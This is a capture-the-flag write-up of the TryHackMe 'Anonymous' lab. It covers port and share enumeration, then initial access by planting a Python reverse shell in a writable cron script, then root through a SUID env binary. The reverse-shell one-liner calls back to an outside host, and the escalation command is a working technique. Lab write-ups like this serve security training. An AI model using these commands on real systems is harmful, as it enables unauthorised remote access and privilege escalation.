# 35 - Anonymous

Room Link --> [https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n -T5 -p- -sS -vv 10.10.135.201

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-   syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```
{% endcode %}

#### FTP enum

```bash
ftp 10.10.135.201

# download all the files.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Oct 23 17:09 removed_f
```

#### SMB enum

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">smbmap -H 10.10.135.201 -u 'anonymous' -p 'anonymous' 

print$          NO ACCESS	Printer Drivers
<strong>pics            READ ONLY	My SMB Share Directory for Pics
</strong>IPC$            NO ACCESS	IPC Service (anonymous server (Samba, Ubuntu))
</code></pre>

We have anonymous access only to the `pics` share.

### Initial Access

The `clean.sh` script file in ftp is running by itself every minute, any we have write access to it, meaning we can modify it and upload  a rev shell inside.

{% code overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.88.214",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# then upload to the ftp sserver.
# ready nc listener.
# and we got a shell.
```
{% endcode %}

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Priv Esc

The user is part of the `lxd` group. I tried that but it was not working so i searched for SUID binaries:

To get a list of all SUID binaries, execute the following command:

**#find / -user root -perm -u=s 2>/dev/null**

/usr/bin/passwd\
**/usr/bin/env ← — here**\
/usr/bin/gpasswd\
/usr/bin/newuidmap\
/usr/bin/newgrp\
/usr/bin/chsh\
/usr/bin/newgidmap\
/usr/bin/chfn\
/usr/bin/sudo\
/usr/bin/traceroute6.iputils\
/usr/bin/pkexec

The "/usr/bin/env" stood out.

`env /bin/sh -p` -- and got root.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Done!



